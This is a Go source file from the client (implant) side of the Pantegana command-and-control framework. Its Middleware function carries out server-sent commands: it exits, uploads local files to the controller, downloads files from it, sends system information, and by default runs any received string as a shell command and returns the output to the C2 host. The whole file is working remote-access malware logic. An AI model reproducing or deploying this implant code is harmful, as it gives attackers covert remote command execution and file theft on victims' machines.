package client

import (
	"log"
	"net/http"
	"os"
	"strings"
)

// Middleware executes the corresponding function from the command that the Pantegana server sent
func Middleware(client *http.Client, cmd string, host string) {
	switch strings.Split(cmd, " ")[0] {
	case "quit":
		log.Println("[+] Quitting due to quit cmd from c2")
		os.Exit(0)
	case "__upload__":
		cmdTokens := strings.Split(cmd, " ")
		if len(cmdTokens) < 3 {
			log.Println("[-] Invalid upload command syntax.")
		} else {
			localFilePath := cmdTokens[1]
			remoteFilePath := cmdTokens[2]
			UploadFile(client, host+uploadFileURL, localFilePath, remoteFilePath)
		}
	case "__download__":
		cmdTokens := strings.Split(cmd, " ")
		if len(cmdTokens) < 3 {
			log.Println("[-] Invalid download command syntax.")
		} else {
			remoteFilePath := cmdTokens[1]
			localFilePath := cmdTokens[2]
			DownloadFile(client, host+downloadFileURL+"?file="+remoteFilePath, localFilePath)
		}
	case "__sysinfo__":
		log.Printf("[+] Sending system information...")
		sysInfo := GetCurrentSysInfo()
		SendSysInfo(client, host+sysInfoURL, sysInfo)
	default: // Just execute the cmd as a system command (example: "ls /")
		ExecAndGetOutput(client, host+cmdOutputURL, string(cmd))
	}
	defer client.CloseIdleConnections()
}
